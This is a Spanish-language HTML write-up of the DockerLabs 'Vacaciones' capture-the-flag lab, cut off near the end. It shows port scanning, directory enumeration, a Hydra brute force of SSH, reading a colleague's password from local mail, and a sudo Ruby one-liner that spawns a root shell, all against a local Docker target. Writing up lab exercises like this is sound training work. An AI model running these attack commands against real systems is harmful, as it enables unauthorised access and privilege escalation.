@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vacaciones | DockerLabs Writeup | danimrtzp</title>
+<link rel="icon" type="image/png" href="../../../imagen.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --cyan: #00f5ff; --cyan-dim: #00c8d4; --cyan-dark: #007a82;
+    --red: #ff2244; --red-dim: #cc1a36; --purple: #9d4edd; --purple-dim: #7b2fd0;
+    --green: #00ff88; --yellow: #ffbd2e;
+    --bg: #050a0f; --bg2: #080d14; --surface: #0d1928; --surface2: #101e30;
+    --text: #c8e6f0; --text-dim: #6a8fa0; --border: rgba(0,245,255,0.15);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif;
+    overflow-x: hidden;
+  }
+  body::before {
+    content: ''; position: fixed; inset: 0;
+    background-image: linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px; pointer-events: none; z-index: 0;
+  }
+  
+  /* NAV */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    background: rgba(5,10,15,0.92); backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border); padding: 0 24px;
+    height: 50px; display: flex; align-items: center; justify-content: space-between;
+  }
+  .nav-logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 16px; color: var(--cyan); text-shadow: 0 0 20px rgba(0,245,255,0.4); letter-spacing: 2px; text-decoration: none; }
+  .nav-bc { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); display: flex; align-items: center; gap: 6px; }
+  .nav-bc a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+  .nav-bc a:hover { color: var(--cyan); }
+  .nav-bc .sep { color: var(--border); }
+  .nav-bc .cur { color: var(--cyan); }
+  
+  /* HERO */
+  .hero {
+    text-align: center; padding: 90px 24px 40px;
+    position: relative; z-index: 1;
+  }
+  .hero-logo {
+    width: 48px; height: 48px; margin: 0 auto 12px;
+  }
+  .hero-logo img { width: 100%; height: 100%; object-fit: contain; }
+  .hero-title {
+    font-family: 'Orbitron', sans-serif; font-weight: 900;
+    font-size: clamp(28px, 6vw, 56px); color: var(--text); letter-spacing: 3px; margin-bottom: 8px; line-height: 1.1;
+  }
+  .hero-subtitle {
+    font-family: 'Share Tech Mono', monospace; font-size: 13px; color: var(--text-dim); letter-spacing: 1px; margin-bottom: 12px;
+  }
+  .hero-desc {
+    font-size: 14px; line-height: 1.6; color: var(--text-dim); max-width: 600px; margin: 0 auto 16px;
+  }
+  .hero-meta {
+    font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;
+  }
+  .hero-meta span { color: var(--cyan); }
+  .diff-badge {
+    display: inline-block; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--green); border: 1px solid rgba(0,255,136,0.3); background: rgba(0,255,136,0.06); padding: 3px 10px; letter-spacing: 1px; margin-bottom: 12px;
+  }
+  
+  /* INDEX BAR */
+  .idx-bar {
+    background: rgba(5,10,15,0.95); border-bottom: 1px solid var(--border); padding: 10px 24px;
+    position: sticky; top: 50px; z-index: 90; backdrop-filter: blur(12px);
+  }
+  .idx-bar-inner {
+    max-width: 800px; margin: 0 auto; display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
+  }
+  .idx-bar-inner a {
+    font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); text-decoration: none; padding: 4px 10px; border: 1px solid var(--border); transition: all 0.2s; white-space: nowrap;
+  }
+  .idx-bar-inner a:hover { color: var(--cyan); border-color: var(--cyan); background: rgba(0,245,255,0.06); }
+  
+  /* MAIN CONTENT */
+  .main {
+    max-width: 800px; margin: 0 auto; padding: 32px 24px;
+    position: relative; z-index: 1;
+  }
+  
+  /* FICHA */
+  .ficha {
+    background: var(--surface); border: 1px solid var(--border); padding: 16px; margin-bottom: 32px;
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px;
+  }
+  .ficha-item {
+    font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim);
+  }
+  .ficha-label { color: var(--cyan); font-size: 9px; letter-spacing: 1px; text-transform: uppercase; display: block; margin-bottom: 2px; }
+  .ficha-val { color: var(--text); font-size: 12px; }
+  
+  /* SECTIONS */
+  .section { margin-bottom: 40px; }
+  .section-title {
+    font-family: 'Orbitron', sans-serif; font-size: 16px; letter-spacing: 2px; color: var(--cyan); margin-bottom: 16px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .section-title::before {
+    content: ''; width: 20px; height: 2px; background: linear-gradient(90deg, var(--cyan), var(--purple));
+  }
+  .section p {
+    font-size: 14px; line-height: 1.7; color: var(--text-dim); margin-bottom: 12px;
+  }
+  .section p strong { color: var(--text); }
+  
+  /* CMD BLOCKS */
+  .cmd {
+    background: #040910; border: 1px solid var(--border); border-radius: 4px; margin: 12px 0; overflow: hidden;
+  }
+  .cmd-header {
+    background: var(--surface2); padding: 8px 12px; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim);
+    display: flex; align-items: center; gap: 6px; border-bottom: 1px solid var(--border);
+  }
+  .cmd-dot { width: 8px; height: 8px; border-radius: 50%; }
+  .cmd-dot-r { background: #ff5f57; }
+  .cmd-dot-y { background: #ffbd2e; }
+  .cmd-dot-g { background: #28ca41; }
+  .cmd-body {
+    padding: 12px 14px; font-family: 'Share Tech Mono', monospace; font-size: 12px; line-height: 1.6; color: var(--text); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;
+  }
+  .cmd-body .comment { color: var(--text-dim); }
+  .cmd-body .cmd-c { color: var(--cyan); }
+  .cmd-body .out { color: var(--text-dim); }
+  .cmd-body .hl { color: var(--red); }
+  .cmd-body .ok { color: var(--green); }
+  .cmd-body .usr { color: var(--purple); }
+  .cmd-body .pwd { color: var(--yellow); }
+  
+  /* IMAGES */
+  .img-box {
+    margin: 16px 0; border: 1px solid var(--border); border-radius: 4px; overflow: hidden;
+    background: var(--surface2); max-width: 100%;
+  }
+  .img-box img {
+    display: block; width: 100%; max-width: 100%; height: auto;
+  }
+  .img-box.sm { max-width: 500px; margin-left: auto; margin-right: auto; }
+  .img-box.xs { max-width: 350px; margin-left: auto; margin-right: auto; }
+  .img-cap {
+    font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); padding: 8px 12px; border-top: 1px solid var(--border); background: var(--surface);
+  }
+  .img-cap span { color: var(--cyan); }
+  
+  /* FINDING */
+  .find {
+    background: rgba(0,245,255,0.04); border: 1px solid var(--border); border-left: 3px solid var(--cyan); padding: 12px 16px; margin: 12px 0;
+  }
+  .find-title {
+    font-family: 'Orbitron', sans-serif; font-size: 11px; letter-spacing: 1px; color: var(--cyan); margin-bottom: 6px;
+  }
+  .find p { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); margin: 0; line-height: 1.6; }
+  .find.red { background: rgba(255,34,68,0.04); border-left: 3px solid var(--red); }
+  .find.red .find-title { color: var(--red); }
+  .find.green { background: rgba(0,255,136,0.04); border-left: 3px solid var(--green); }
+  .find.green .find-title { color: var(--green); }
+  
+  /* GLOSSARY */
+  .glossary {
+    background: var(--surface); border: 1px solid var(--border); padding: 16px; margin-top: 32px;
+  }
+  .glossary-title {
+    font-family: 'Orbitron', sans-serif; font-size: 13px; letter-spacing: 2px; color: var(--purple); margin-bottom: 12px;
+  }
+  .glossary-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 8px;
+  }
+  .glossary-item {
+    font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); line-height: 1.5;
+  }
+  .glossary-item strong { color: var(--cyan); }
+  
+  /* FOOTER */
+  footer {
+    border-top: 1px solid var(--border); padding: 20px 24px;
+    display: flex; justify-content: space-between; align-items: center; gap: 12px;
+    position: relative; z-index: 1; max-width: 800px; margin: 0 auto;
+  }
+  .footer-logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 14px; color: var(--cyan); letter-spacing: 2px; }
+  .footer-text { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); }
+  
+  /* RESPONSIVE */
+  @media(max-width: 600px) {
+    .ficha { grid-template-columns: 1fr; }
+    .hero-title { font-size: 28px; }
+    .cmd-body { font-size: 10px; }
+    .nav-logo { font-size: 14px; }
+    .nav-bc { font-size: 10px; }
+  }
+  
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg2); }
+  ::-webkit-scrollbar-thumb { background: var(--cyan-dark); border-radius: 3px; }
+  
+  /* Matrix Canvas */
+  #matrix-canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; opacity: 0.12; }
+  
+  /* Scanlines */
+  body::after { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); pointer-events: none; z-index: 9998; }
+
+  /* SPOTLIGHT + 3D TILT EFFECT */
+  .spotlight {
+    position: relative;
+    overflow: hidden;
+    transform-style: preserve-3d;
+    will-change: transform;
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.3s, border-color 0.3s;
+  }
+  .spotlight::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: inherit;
+    background: radial-gradient(circle 150px at var(--mx, 0px) var(--my, 0px), rgba(0,245,255,0.25), transparent 80%);
+    opacity: 0;
+    pointer-events: none;
+    z-index: 1;
+    transition: opacity 0.3s ease;
+  }
+  .spotlight:hover::after {
+    opacity: 1;
+  }
+  .spotlight:hover {
+    box-shadow: 0 0 40px rgba(0,245,255,0.15), 0 0 80px rgba(157,78,221,0.08);
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix-canvas"></canvas>
+
+<nav>
+  <a class="nav-logo" href="../../../../index.html">DANIMRTZP</a>
+  <div class="nav-bc">
+    <a href="../../index.html">writeups</a><span class="sep">/</span><a href="../index.html">dockerlabs</a><span class="sep">/</span><span class="cur">vacaciones</span>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="hero-logo">
+    <img src="../../../logo.png" alt="DockerLabs">
+  </div>
+  <div class="diff-badge">Muy Fácil</div>
+  <h1 class="hero-title">VACACIONES</h1>
+  <p class="hero-subtitle">DOCKERLABS</p>
+  <p class="hero-desc">Laboratorio para practicar fuerza bruta contra SSH y escalada de privilegios en Linux. Un mensaje escondido en el código fuente de la web y una contraseña vulnerable nos abren el camino.</p>
+  <div class="hero-meta">
+    <span>Autor:</span> danimrtzp
+    <span>Fecha:</span> 2026-06-06
+    <span>Tipo:</span> Linux / SSH / Web
+  </div>
+</div>
+
+<div class="idx-bar">
+  <div class="idx-bar-inner">
+    <a href="#ficha">Ficha</a>
+    <a href="#recon">Nmap</a>
+    <a href="#enum">Gobuster</a>
+    <a href="#exploit">Fuerza Bruta</a>
+    <a href="#post">Post-Exploit</a>
+    <a href="#privesc">Privesc</a>
+    <a href="#glossary">Glosario</a>
+  </div>
+</div>
+
+<div class="main">
+  
+  <!-- FICHA TÉCNICA -->
+  <div class="ficha spotlight" id="ficha">
+    <div class="ficha-item">
+      <span class="ficha-label">OS</span>
+      <span class="ficha-val">Ubuntu Linux (Docker)</span>
+    </div>
+    <div class="ficha-item">
+      <span class="ficha-label">Dificultad</span>
+      <span class="ficha-val">Muy Fácil</span>
+    </div>
+    <div class="ficha-item">
+      <span class="ficha-label">Vector inicial</span>
+      <span class="ficha-val">Fuerza bruta SSH</span>
+    </div>
+    <div class="ficha-item">
+      <span class="ficha-label">Escalada</span>
+      <span class="ficha-val">Sudo Abuse / GTFOBins</span>
+    </div>
+    <div class="ficha-item">
+      <span class="ficha-label">Puertos</span>
+      <span class="ficha-val">22 (SSH), 80 (HTTP)</span>
+    </div>
+    <div class="ficha-item">
+      <span class="ficha-label">Técnicas</span>
+      <span class="ficha-val">Nmap, Gobuster, Hydra, Sudo</span>
+    </div>
+  </div>
+  
+  <!-- RECONOCIMIENTO -->
+  <section class="section" id="recon">
+    <h2 class="section-title">Reconocimiento</h2>
+    <p>El primer paso en cualquier pentest es conocer la superficie de ataque. Utilizamos <strong>Nmap</strong>, el escáner de red más popular, para descubrir qué puertos están abiertos en la máquina objetivo y qué servicios corren detrás de ellos.</p>
+    <p>La flag <code>-p-</code> escanea todos los 65535 puertos TCP, <code>-sS</code> realiza un SYN stealth scan, <code>-sC</code> ejecuta scripts de detección por defecto, <code>-sV</code> detecta versiones, y <code>-oN</code> guarda el resultado en un archivo.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Escaneo de puertos con Nmap</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo</span>
+
+<span class="out">Nmap scan report for 172.17.0.2</span>
+<span class="out">Host is up, received arp-response (0.0000040s latency).</span>
+<span class="out">Scanned at 2026-06-06 20:41:17 CEST for 7s</span>
+
+<span class="out">PORT   STATE SERVICE REASON         VERSION</span>
+<span class="out">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</span>
+<span class="out">80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="out">|_http-title: Site doesn't have a title (text/html).</span>
+<span class="out">|_http-server-header: Apache/2.4.29 (Ubuntu)</span>
+
+<span class="comment"># Detectamos dos puertos abiertos: SSH (22) y HTTP (80).</span>
+<span class="comment"># Guardamos el resultado en 'escaneo' para consultarlo luego.</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/escaneo_nmap.png" alt="Escaneo Nmap">
+      <div class="img-cap"><span>Fig 1.</span> Escaneo de puertos con Nmap — detectamos SSH (22) y HTTP (80) abiertos.</div>
+    </div>
+  </section>
+  
+  <!-- ENUMERACIÓN -->
+  <section class="section" id="enum">
+    <h2 class="section-title">Enumeración</h2>
+    <p>Con el puerto HTTP (80) abierto, revisamos la web. El título indica que no hay contenido, solo HTML vacío. Usamos <strong>Gobuster</strong> para descubrir archivos y directorios ocultos.</p>
+    <p>La flag <code>-u</code> especifica la URL, <code>-w</code> el diccionario, y <code>-x</code> las extensiones a buscar.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Enumeración de directorios con Gobuster</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt</span>
+
+<span class="out">===============================================================</span>
+<span class="out">Gobuster v3.8.2</span>
+
+<span class="out">[+] Url:                      http://172.17.0.2</span>
+<span class="out">[+] Method:                   GET</span>
+<span class="out">[+] Threads:                  10</span>
+<span class="out">[+] Extensions:               html,txt,php</span>
+
+<span class="out">===============================================================</span>
+<span class="out">Starting gobuster in directory enumeration mode</span>
+<span class="out">===============================================================</span>
+
+<span class="out">index.html            (Status: 200) [Size: 74]</span>
+<span class="out">javascript            (Status: 301) [Size: 313]</span>
+<span class="out">server-status         (Status: 403) [Size: 275]</span>
+<span class="out">Progress: 830564 / 830564 (100.00%)</span>
+<span class="out">===============================================================</span>
+<span class="out">Finished</span>
+<span class="out">===============================================================</span>
+
+<span class="comment"># La web solo tiene index.html. Nada más que enumerar.</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/enumeracion_directorios.png" alt="Enumeración Gobuster">
+      <div class="img-cap"><span>Fig 2.</span> Gobuster solo encuentra index.html, javascript y server-status. No hay directorios ocultos.</div>
+    </div>
+    
+    <p>La web está en blanco, así que inspeccionamos el <strong>código fuente</strong> con <code>Ctrl+U</code>. Es una técnica común en CTFs: los desarrolladores dejan pistas en comentarios HTML.</p>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/analizar_web.png" alt="Web vacía">
+      <div class="img-cap"><span>Fig 3.</span> La web está completamente en blanco — solo carga index.html sin contenido visible.</div>
+    </div>
+    
+    <div class="find spotlight">
+      <div class="find-title">🔍 HALLAZGO</div>
+      <p>En el código fuente (Ctrl+U) encontramos un comentario HTML escondido:</p>
+      <p style="margin-top:6px; color:var(--text);"><span class="hl">&lt;!-- De : Juan Para: Camilo , te he dejado un correo es importante... --&gt;</span></p>
+      <p style="margin-top:6px;">Dos usuarios potenciales: <strong>juan</strong> y <strong>camilo</strong>. Y hay un "correo" importante.</p>
+    </div>
+    
+    <div class="img-box sm spotlight">
+      <img src="../../images/dockerlabs/vacaciones/mensaje_escondido.png" alt="Mensaje escondido">
+      <div class="img-cap"><span>Fig 4.</span> Comentario HTML oculto revelando usuarios <strong>juan</strong> y <strong>camilo</strong>.</div>
+    </div>
+    
+    <p>Revisamos el archivo de escaneo para confirmar que SSH está abierto antes de intentar fuerza bruta:</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Revisión del escaneo guardado</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">cat escaneo</span>
+
+<span class="out"># Nmap 7.99 scan initiated Sat Jun  6 20:41:17 2026</span>
+<span class="out">Nmap scan report for 172.17.0.2</span>
+<span class="out">Host is up, received arp-response (0.0000040s latency).</span>
+<span class="out">Not shown: 65533 closed tcp ports (reset)</span>
+<span class="out">PORT   STATE SERVICE REASON      VERSION</span>
+<span class="out">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</span>
+<span class="out">80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))</span>
+
+<span class="comment"># Confirmado: SSH abierto. Vector de ataque: fuerza bruta vía SSH.</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/recordatorio_escaneo_nmap.png" alt="Revisión escaneo Nmap">
+      <div class="img-cap"><span>Fig 5.</span> Revisamos el archivo de escaneo con <span class="cmd-c">cat escaneo</span> para confirmar el puerto SSH (22).</div>
+    </div>
+  </section>
+  
+  <!-- EXPLOTACIÓN -->
+  <section class="section" id="exploit">
+    <h2 class="section-title">Explotación</h2>
+    <p>Con dos usuarios potenciales y SSH abierto, usamos <strong>Hydra</strong> para ataque de fuerza bruta. <code>-l</code> usuario fijo, <code>-P</code> diccionario rockyou.txt, <code>-I</code> ignora verificación de archivo.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Fuerza bruta SSH con Hydra</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I</span>
+
+<span class="out">Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak</span>
+<span class="out">[WARNING] Many SSH configurations limit the number of parallel tasks...</span>
+<span class="out">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries...</span>
+<span class="out">[DATA] attacking ssh://172.17.0.2:22/</span>
+
+<span class="ok">[22][ssh] host: 172.17.0.2   login: <span class="usr">camilo</span>   password: <span class="pwd">password1</span></span>
+
+<span class="ok">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="comment"># ¡Credenciales encontradas! camilo:password1</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/fuerza_bruta_camilo.png" alt="Fuerza bruta Hydra">
+      <div class="img-cap"><span>Fig 6.</span> Hydra encuentra la contraseña de <strong>camilo</strong>: <span class="hl">password1</span>.</div>
+    </div>
+    
+    <p>Nos conectamos por SSH como <strong>camilo</strong>. Exportamos <code>TERM=xterm</code> para que la terminal funcione correctamente.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Conexión SSH como camilo</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">ssh camilo@172.17.0.2</span>
+<span class="out">** WARNING: connection is not using a post-quantum key exchange algorithm...</span>
+<span class="out">camilo@172.17.0.2's password:</span>
+<span class="ok">$</span> <span class="comment"># Acceso obtenido como camilo</span>
+$ <span class="cmd-c">export TERM=xterm</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/conexion_ssh_camilo.png" alt="Conexión SSH camilo">
+      <div class="img-cap"><span>Fig 7.</span> Conexión SSH exitosa como <strong>camilo</strong>.</div>
+    </div>
+  </section>
+  
+  <!-- POST-EXPLOTACIÓN -->
+  <section class="section" id="post">
+    <h2 class="section-title">Post-Explotación</h2>
+    <p>Ya dentro como <strong>camilo</strong>, intentamos escalar privilegios. El comando <strong><code>sudo -l</code></strong> lista qué comandos puede ejecutar el usuario con privilegios de root.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Verificación de permisos sudo como camilo</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">sudo -l</span>
+<span class="out">[sudo] password for camilo:</span>
+<span class="hl">Sorry, user camilo may not run sudo on ab43b6d8ed09.</span>
+
+<span class="comment"># Camilo no tiene permisos sudo. No puede escalar directamente.</span>
+<span class="comment"># Necesitamos encontrar otra forma de avanzar.</span></div>
+    </div>
+    
+    <div class="img-box sm spotlight">
+      <img src="../../images/dockerlabs/vacaciones/sudo-l_camilo.png" alt="sudo -l camilo">
+      <div class="img-cap"><span>Fig 8.</span> <span class="cmd-c">sudo -l</span> como camilo confirma que NO tiene permisos sudo.</div>
+    </div>
+    
+    <p>Camilo no puede escalar. Recordemos el mensaje del código fuente: <em>"De: Juan Para: Camilo, te he dejado un correo es importante..."</em>. Como ya somos camilo, hay un correo esperándonos.</p>
+    <p>En Linux, los correos locales se almacenan en <strong>/var/mail</strong>. Primero revisamos los usuarios del sistema en <strong>/home</strong>:</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Enumeración de usuarios en /home</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">cd /home</span>
+$ <span class="cmd-c">ls</span>
+<span class="ok">camilo  juan  pedro</span>
+
+<span class="comment"># Encontramos 3 usuarios: camilo (nosotros), juan y pedro.</span>
+<span class="comment"># El mensaje mencionaba a Juan, así que probablemente él dejó el correo.</span></div>
+    </div>
+    
+    <div class="img-box xs spotlight">
+      <img src="../../images/dockerlabs/vacaciones/ver_usuarios_home.png" alt="Usuarios en /home">
+      <div class="img-cap"><span>Fig 9.</span> <strong>/home</strong> revela tres usuarios: camilo, juan y pedro.</div>
+    </div>
+    
+    <p>Ahora buscamos el correo en <strong>/var/mail</strong>. Navegamos hasta encontrar el correo de camilo:</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Búsqueda del correo en /var/mail</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">cd /var/mail</span>
+$ <span class="cmd-c">ls</span>
+<span class="ok">camilo</span>
+$ <span class="cmd-c">cd camilo</span>
+$ <span class="cmd-c">ls</span>
+<span class="ok">correo.txt</span>
+$ <span class="cmd-c">cat correo.txt</span>
+<span class="out">Hola Camilo,</span>
+
+<span class="out">Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: <span class="pwd">2k84dicb</span></span>
+
+<span class="comment"># ¡Encontramos la contraseña de juan! 2k84dicb</span>
+<span class="comment"># Como el correo lo envió juan, es lógico que sea su contraseña.</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/mensaje_correo_var.png" alt="Correo en /var/mail">
+      <div class="img-cap"><span>Fig 10.</span> Exploración de <strong>/var/mail</strong> → encontramos <strong>correo.txt</strong> con la contraseña de Juan: <span class="hl">2k84dicb</span>.</div>
+    </div>
+    
+    <p>Con la contraseña de <strong>juan</strong>, usamos <strong><code>su - juan</code></strong> para pivotar. <code>su</code> (switch user) cambia de usuario. La flag <code>-</code> simula un login completo.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Pivot a usuario juan</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">su - juan</span>
+<span class="out">Password:</span>
+$ <span class="cmd-c">whoami</span>
+<span class="ok">juan</span>
+
+<span class="comment"># ¡Pivot exitoso! Ahora somos juan.</span></div>
+    </div>
+    
+    <div class="img-box xs spotlight">
+      <img src="../../images/dockerlabs/vacaciones/conexion_juan.png" alt="Conexión como juan">
+      <div class="img-cap"><span>Fig 11.</span> <span class="cmd-c">su - juan</span> con contraseña <strong>2k84dicb</strong> → <span class="cmd-c">whoami</span> confirma que somos juan.</div>
+    </div>
+  </section>
+  
+  <!-- ESCALADA DE PRIVILEGIOS -->
+  <section class="section" id="privesc">
+    <h2 class="section-title">Escalada de Privilegios</h2>
+    <p>Como usuario <strong>juan</strong>, repetimos: <code>sudo -l</code> para ver qué comandos puede ejecutar como root.</p>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Verificación de sudo como juan</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">sudo -l</span>
+
+<span class="out">Matching Defaults entries for juan on ab43b6d8ed09:</span>
+<span class="out">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+
+<span class="out">User juan may run the following commands on ab43b6d8ed09:</span>
+<span class="ok">    (ALL) NOPASSWD: /usr/bin/ruby</span>
+
+<span class="comment"># ¡Juan puede ejecutar ruby como root sin contraseña!</span>
+<span class="comment"># NOPASSWD significa que no pide contraseña al usar sudo.</span></div>
+    </div>
+    
+    <div class="find red spotlight">
+      <div class="find-title">⚠️ VULNERABILIDAD — Sudo Misconfiguration</div>
+      <p><strong>sudo -l</strong> revela que <strong>juan</strong> puede ejecutar <strong>/usr/bin/ruby</strong> como <strong>root</strong> con <strong>NOPASSWD</strong>. Esto es una configuración incorrecta: otorgar permisos sin contraseña a un binario interactivo permite escalar privilegios trivialmente.</p>
+      <p style="margin-top:6px;">Consultamos <strong>GTFOBins</strong> (gtfobins.github.io), un repositorio que documenta cómo abusar de binarios con permisos sudo. Para Ruby:</p>
+      <p style="margin-top:6px; color:var(--cyan);"><strong>sudo ruby -e 'exec "/bin/bash"'</strong></p>
+      <p style="margin-top:6px;">El parámetro <code>-e</code> ejecuta código Ruby inline. <code>exec</code> reemplaza el proceso Ruby con una shell bash, y como sudo la ejecuta como root, obtenemos shell root.</p>
+    </div>
+    
+    <div class="cmd spotlight">
+      <div class="cmd-header">
+        <div class="cmd-dot cmd-dot-r"></div>
+        <div class="cmd-dot cmd-dot-y"></div>
+        <div class="cmd-dot cmd-dot-g"></div>
+        <span>Escalada a root con Ruby</span>
+      </div>
+      <div class="cmd-body">$ <span class="cmd-c">sudo ruby -e 'exec "/bin/bash"'</span>
+
+<span class="ok">root@ab43b6d8ed09:~#</span> <span class="comment"># ¡SOMOS ROOT!</span>
+
+<span class="cmd-c">root@ab43b6d8ed09:~# whoami</span>
+<span class="ok">root</span>
+
+<span class="cmd-c">root@ab43b6d8ed09:~# id</span>
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="comment"># Escalada de privilegios completada con éxito.</span>
+<span class="comment"># uid=0 confirma que somos root (superusuario).</span></div>
+    </div>
+    
+    <div class="img-box spotlight">
+      <img src="../../images/dockerlabs/vacaciones/escalar_privilegios_juan_a_root.png" alt="Escalada a root">
